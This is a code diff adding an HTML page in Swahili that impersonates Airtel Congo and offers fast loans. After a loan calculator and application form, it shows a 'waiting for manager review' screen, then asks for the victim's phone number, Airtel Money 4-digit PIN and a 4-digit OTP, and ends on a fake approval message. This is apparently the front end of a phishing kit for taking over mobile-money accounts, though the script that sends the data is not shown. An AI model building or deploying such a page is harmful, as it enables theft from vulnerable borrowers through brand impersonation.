@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Airtel Congo - Mkopo wa Haraka & Portal</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <header class="bank-header">
+    <div class="header-container">
+      <div class="logo-area">
+        <span class="bank-badge">AIRTEL</span>
+        <h1 class="bank-title">Airtel Congo</h1>
+      </div>
+    </div>
+  </header>
+
+  <main class="main-content">
+    <!-- VIEW 1: LOAN CALCULATOR / HOME -->
+    <div id="view-calculator" class="card active-card">
+      <h2>Pata Mkopo Wako Leo</h2>
+      <p class="subtitle">Uidhinishaji wa haraka • Riba nafuu • Masharti rahisi</p>
+      
+      <div class="calc-box">
+        <div class="input-group">
+          <label>Kiasi cha Mkopo (USD)</label>
+          <input type="text" id="calc-amount" value="$2,500" readonly>
+          <input type="range" id="amount-range" min="100" max="5000" step="50" value="2500">
+          <div class="range-labels"><span>$100</span><span>$5,000</span></div>
+        </div>
+
+        <div class="input-group">
+          <label>Muda wa Mkopo (Miezi)</label>
+          <input type="range" id="duration-range" min="3" max="24" value="12">
+          <span id="duration-val">Miezi 12</span>
+        </div>
+
+        <div class="monthly-display">
+          <span>Malipo ya Kila Mwezi</span>
+          <h3 id="monthly-payment">$235</h3>
+        </div>
+      </div>
+
+      <button id="btn-start-app" class="primary-btn">OMBA SASA</button>
+
+      <div class="features-row">
+        <div class="feature-item">
+          ⚡ <strong>Haraka</strong>
+          <span>Ndani ya saa 24</span>
+        </div>
+        <div class="feature-item">
+          💰 <strong>Riba Ndogo</strong>
+          <span>Kuanzia 10%</span>
+        </div>
+        <div class="feature-item">
+          🔒 <strong>Salama</strong>
+          <span>Ulinzi wa Airtel Money</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- VIEW 2: MULTI-STEP APPLICATION FORM -->
+    <div id="view-form" class="card hidden">
+      <div class="form-header">
+        <h2>Maombi ya Mkopo</h2>
+        <span id="step-indicator">Hatua 1 kati ya 3</span>
+      </div>
+      <div class="progress-bar-container">
+        <div id="progress-fill" style="width: 33%;"></div>
+      </div>
+
+      <!-- Step 1: Details -->
+      <div class="form-step active-step" data-step="1">
+        <div class="field">
+          <label>Aina ya Mkopo</label>
+          <select id="loan-type">
+            <option value="" disabled selected>Chagua aina ya mkopo (Mfano: Mkopo wa Biashara)</option>
+            <option value="Mkopo wa Biashara">Mkopo wa Biashara</option>
+            <option value="Mkopo wa Haraka">Mkopo wa Haraka</option>
+            <option value="Mkopo wa Dharura">Mkopo wa Dharura</option>
+          </select>
+        </div>
+        <div class="field">
+          <label>Kiasi cha Mkopo (USD)</label>
+          <input type="number" id="form-amount" placeholder="Mfano: 2500" required>
+        </div>
+        <div class="field">
+          <label>Sababu ya Mkopo</label>
+          <textarea id="loan-purpose" placeholder="Mfano: Kupanua biashara yangu ya duka" rows="3" required></textarea>
+        </div>
+        <button type="button" class="primary-btn next-btn" disabled>HATUA INAYOFUATA</button>
+      </div>
+
+      <!-- Step 2: Personal Info & Airtel Congo Number -->
+      <div class="form-step hidden" data-step="2">
+        <div class="row-fields">
+          <div class="field">
+            <label>Jina la Kwanza</label>
+            <input type="text" id="first-name" placeholder="Mfano: Jean" required>
+          </div>
+          <div class="field">
+            <label>Jina la Mwisho</label>
+            <input type="text" id="last-name" placeholder="Mfano: Kabamba" required>
+          </div>
+        </div>
+        <div class="field">
+          <label>Namba ya Airtel Congo</label>
+          <input type="tel" id="user-contact" placeholder="Mfano: +243991234567" required>
+          <small class="hint">Weka namba halisi ya Airtel Congo (Vizuizi: +243 97, 98, 99).</small>
+        </div>
+        <div class="button-group">
+          <button type="button" class="secondary-btn prev-btn">NYUMA</button>
+          <button type="button" class="primary-btn next-btn" disabled>HATUA INAYOFUATA</button>
+        </div>
+      </div>
+
+      <!-- Step 3: Employment & Summary -->
+      <div class="form-step hidden" data-step="3">
+        <div class="field">
+          <label>Hali ya Ajira</label>
+          <select id="employment-status">
+            <option value="" disabled selected>Chagua hali ya ajira (Mfano: Mmiliki wa Biashara)</option>
+            <option value="Ameajiriwa">Ameajiriwa</option>
+            <option value="Kujiajiri">Kujiajiri</option>
+            <option value="Mmiliki wa Biashara">Mmiliki wa Biashara</option>
+          </select>
+        </div>
+        <div class="field">
+          <label>Mapato ya Mwaka (USD)</label>
+          <input type="number" id="annual-income" placeholder="Mfano: 12000" required>
+        </div>
+
+        <div class="summary-box">
+          <h3>Muhtasari wa Maombi</h3>
+          <p><strong>Kiasi:</strong> <span id="sum-amount">-</span></p>
+          <p><strong>Muda:</strong> <span id="sum-duration">-</span></p>
+          <p><strong>Sababu:</strong> <span id="sum-purpose">-</span></p>
+          <p><strong>Mwombaji:</strong> <span id="sum-name">-</span></p>
+        </div>
+
+        <div class="button-group">
+          <button type="button" class="secondary-btn prev-btn">NYUMA</button>
+          <button type="button" id="btn-submit-app" class="primary-btn" disabled>WASILISHA MAOMBI</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- VIEW 3: WAITING FOR ADMIN APPROVAL -->
+    <div id="view-waiting" class="card hidden center-card">
+      <div class="spinner"></div>
+      <h2>Maombi Yamewasilishwa</h2>
+      <p>Maombi yako yametumwa. Tafadhali subiri uthibitisho.</p>
+      <div class="status-box">
+        <span id="waiting-status-text">Inasubiri meneja kukagua maelezo...</span>
+      </div>
+    </div>
+
+    <!-- VIEW 4: PIN ENTRY (4 DIGITS) -->
+    <div id="view-login" class="card hidden">
+      <div class="login-header">
+        <span class="bank-badge sm">AIRTEL</span>
+        <h2>Ingiza Namba ya Airtel Congo</h2>
+        <p>Weka namba yako ya simu na PIN (namba 4) ili kuendelea</p>
+      </div>
+      <div class="field">
+        <label>Namba ya Airtel Congo</label>
+        <input type="tel" id="login-contact" placeholder="Mfano: +243991234567" required>
+      </div>
+      <div class="field">
+        <label>Ingiza PIN ya Airtel Money (Namba 4)</label>
+        <div class="pin-inputs">
+          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+        </div>
+        <span id="pin-error" class="error-text hidden">PIN si sahihi. Tafadhali jaribu tena.</span>
+      </div>
+      <button id="btn-login" class="primary-btn" disabled>INGIA</button>
+    </div>
+
+    <!-- VIEW 5: OTP VERIFICATION (4 DIGITS) -->
+    <div id="view-otp" class="card hidden">
+      <h2>Uthibitisho wa OTP</h2>
+      <p>Ingiza namba 4 za OTP zilizotumwa kwenda <span id="otp-target-display"></span></p>
+      <div class="field">
+        <div class="otp-inputs">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+        </div>
+        <span id="otp-error" class="error-text hidden">OTP si sahihi. Tafadhali jaribu tena.</span>
+      </div>
+      <button id="btn-submit-otp" class="primary-btn" disabled>WASILISHA OTP</button>
+    </div>
+
+    <!-- VIEW 6: SUCCESS -->
+    <div id="view-success" class="card hidden center-card">
+      <div class="success-icon">✓</div>
+      <h2>Hongera!</h2>
+      <p>Mkopo wako umeidhinishwa! Fedha zitatumwa kwenye akaunti yako ya Airtel Money hivi punde.</p>
+      <div class="approved-amount-box">
+        <span>KIASI KILICHOPITISHWA</span>
+        <h3 id="approved-amount-val">$2,500</h3>
+      </div>
+      <button id="btn-home" class="primary-btn">RUDI MWANZO</button>
+    </div>
+  </main>
+
+  <footer class="bank-footer">
+    <p>&copy; 2026 Airtel Congo. Haki zote zimehifadhiwa.</p>
+  </footer>
+
+  <script src="script.js"></script>
+</body>
+  </html>
+          
